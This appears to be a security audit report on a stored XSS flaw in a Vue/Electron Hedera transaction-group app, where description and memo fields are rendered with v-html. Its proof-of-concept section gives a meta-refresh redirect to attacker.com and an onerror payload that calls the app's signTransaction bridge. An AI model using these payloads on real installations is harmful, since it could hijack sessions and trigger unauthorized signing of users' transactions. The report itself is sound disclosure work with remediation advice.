Based on my investigation of the repository, I can confirm the key claims. Here is my audit:

---

Audit Report

## Title
Stored XSS via Unsanitized `groupItem.description` and `transactionMemo` Rendered with `v-html` in `CreateTransactionGroup.vue`

## Summary
The `CreateTransactionGroup.vue` component passes user-controlled strings — `groupItem.description` and `Transaction.fromBytes(groupItem.transactionBytes).transactionMemo` — directly to Vue's `v-html` directive without any sanitization. In Organization Mode, these values are persisted server-side and fetched by all organization members, constituting a stored HTML/script injection vulnerability. A production-mode CSP (`script-src 'self'`) partially mitigates JavaScript execution but does not prevent all HTML injection attack vectors.

## Finding Description

**Confirmed vulnerable code** at lines 421–429 of `CreateTransactionGroup.vue`:

```vue
v-html="
  groupItem.type == 'Transfer Transaction'
    ? makeTransfer(index)
    : groupItem.description != ''
      ? groupItem.description
      : Transaction.fromBytes(groupItem.transactionBytes).transactionMemo
        ? Transaction.fromBytes(groupItem.transactionBytes).transactionMemo
        : createTransactionId(groupItem.payerAccountId, groupItem.validStart)
"
``` [1](#0-0) 

`v-html` bypasses Vue's template escaping and sets raw HTML on the DOM element. Both `groupItem.description` (a free-text field set by the creator) and `transactionMemo` (embedded in serialized transaction bytes) are user-controlled and fetched from the NestJS backend without any sanitization before being passed to `v-html`.

The `escapeHtml` utility that exists in the codebase is confined to the backend email template system and is never imported or used in the frontend renderer: [2](#0-1) 

**Partial CSP mitigation:** In production mode only, a `Content-Security-Policy: script-src 'self'` header is applied via `onHeadersReceived`: [3](#0-2) 

This CSP blocks inline event handlers (e.g., `onerror="..."`) and `<script>` tags in Chromium/Electron. However:
- It is **not applied in development mode**.
- It only restricts `script-src`, leaving other HTML injection vectors open (see Impact).

## Impact Explanation

Even with `script-src 'self'` blocking inline JavaScript, injected HTML can still:

1. **Inject misleading UI elements** (phishing overlays, fake "sign transaction" buttons) that trick victims into performing sensitive actions.
2. **Exfiltrate data via CSS injection** using injected `<link rel="stylesheet">` or `<style>` tags (not restricted by `script-src`).
3. **Redirect the page** via `<meta http-equiv="refresh" content="0;url=...">`.
4. **Submit data to attacker-controlled servers** via injected `<form action="https://attacker.com">` elements.

If the CSP is absent (dev mode) or bypassed, the impact escalates dramatically. The preload script exposes highly sensitive IPC channels via `contextBridge`:

- `keyPairs.decryptPrivateKey` — decrypt stored private keys
- `transactions.signTransaction` — sign arbitrary transactions
- `transactions.executeTransaction` — submit transactions to the Hedera network [4](#0-3) [5](#0-4) 

In a dev environment or if the CSP is bypassed, an attacker could trigger unauthorized transaction signing or key export on behalf of the victim.

## Likelihood Explanation

- **Attacker precondition:** Valid organization membership only; no elevated privileges required.
- **Trigger:** Victim opens a transaction group — a routine, expected workflow.
- **Persistence:** Payload is stored server-side in PostgreSQL and fires for every member who views the group.
- **No special user interaction:** The victim does not need to click anything beyond normal navigation.

## Recommendation

1. **Replace `v-html` with safe text interpolation** (`{{ }}`) for all user-controlled fields. `v-html` should only be used with trusted, application-generated content.
2. If HTML rendering is genuinely required, sanitize input with a library such as [DOMPurify](https://github.com/cure53/DOMPurify) before passing to `v-html`.
3. **Strengthen the CSP** to include `default-src 'self'`, `style-src 'self'`, `img-src 'self' data:`, and `form-action 'self'` to close the remaining non-script injection vectors.
4. Apply the CSP in **all modes**, not only production.

## Proof of Concept

1. Attacker (valid org member) creates a transaction group item and sets `description` to:
   ```html
   <meta http-equiv="refresh" content="0;url=https://attacker.com">
   ```
   (works even with `script-src 'self'` CSP — redirects victim's app session)

   Or in dev mode / without CSP:
   ```html
   <img src=x onerror="window.electronAPI.local.transactions.signTransaction(...)">
   ```

2. The group is saved to the NestJS API and stored in PostgreSQL.
3. Any organization member opens the "Create Transaction Group" page for that group.
4. The Vue component renders `groupItem.description` via `v-html` at line 425, executing the payload. [6](#0-5)

### Citations

**File:** front-end/src/renderer/pages/CreateTransactionGroup/CreateTransactionGroup.vue (L421-429)
```vue
                v-html="
                  groupItem.type == 'Transfer Transaction'
                    ? makeTransfer(index)
                    : groupItem.description != ''
                      ? groupItem.description
                      : Transaction.fromBytes(groupItem.transactionBytes).transactionMemo
                        ? Transaction.fromBytes(groupItem.transactionBytes).transactionMemo
                        : createTransactionId(groupItem.payerAccountId, groupItem.validStart)
                "
```

**File:** back-end/libs/common/src/templates/layout.ts (L130-143)
```typescript
export function escapeHtml(str: string | null | undefined): string {
  if (str == null) {
    return "";
  }

  const value = String(str);

  return value
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}
```

**File:** front-end/src/main/index.ts (L54-63)
```typescript
    if (!is.dev) {
      session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
        callback({
          responseHeaders: {
            ...details.responseHeaders,
            'Content-Security-Policy': ["script-src 'self'"],
          },
        });
      });
    }
```

**File:** front-end/src/preload/localUser/keyPairs.ts (L27-29)
```typescript
      publicKey: string,
    ): Promise<string> =>
      ipcRenderer.invoke('keyPairs:decryptPrivateKey', userId, password, publicKey),
```

**File:** front-end/src/preload/localUser/transactions.ts (L13-27)
```typescript
    signTransaction: (
      transactionBytes: Uint8Array,
      publicKeys: string[],
      userId: string,
      userPassword: string | null,
      needsFreeze: boolean
    ): Promise<Uint8Array> =>
      ipcRenderer.invoke(
        'transactions:signTransaction',
        transactionBytes,
        publicKeys,
        userId,
        userPassword,
        needsFreeze
      ),
```
